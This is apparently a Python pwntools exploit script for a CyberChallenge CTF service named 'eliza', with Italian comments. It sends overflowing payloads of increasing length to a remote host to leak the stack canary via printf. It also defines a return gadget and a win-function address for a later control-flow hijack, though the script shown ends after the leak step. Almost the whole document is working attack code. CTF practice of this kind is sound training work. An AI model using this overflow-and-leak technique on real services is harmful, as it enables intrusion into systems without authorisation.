from pwn import *

HOST = 'eliza.challs.cyberchallenge.it'
PORT = 9131

ret_gadget = 0x4006ee
sp4wn      = 0x400897

p = remote(HOST, PORT)
p.recvuntil(b'Ask me anything...\n')

# Iterazione 1: scrivi 81 A, sovrascrive \x00 del canary
# ma printf si ferma se i byte successivi del canary sono \x00
# Soluzione: scrivi OLTRE il canary per leakare tutto in una volta!
# Layout: [80 buf][8 canary][8 rbp][8 ret]
# Scrivi 80+8+1 = 89 byte → sovrascrive canary intero + 1 byte di rbp
# Così printf legge buf + canary (anche se ha zeri interni) + rbp

# Prima passata: leak canary byte per byte sfruttando il loop
# Manda 81 byte → se canary[1] != 0 lo vediamo, senno mandiamo 82, ecc.

leaked_extra = b''
for size in range(81, 97):  # fino oltre il canary+rbp
    p.recvuntil(b'Ask me anything...\n') if size > 81 else None
    payload = b'A' * size + b'\n'
    p.send(payload)
    
    resp = p.recvuntil(b'\n', timeout=3)
    if b'Sorry' in resp:
        leaked = resp.split(b'Sorry, "')[1].split(b'" is too long')[0]
        extra = leaked[size:]
        print(f'size={size}: extra={extra.hex() if extra else "none"}')
        if extra:
            leaked_extra = extra
            break
    p.recvuntil(b'Ask me anything...\n')

print(f'[+] Leaked after buffer: {leaked_extra.hex()}')
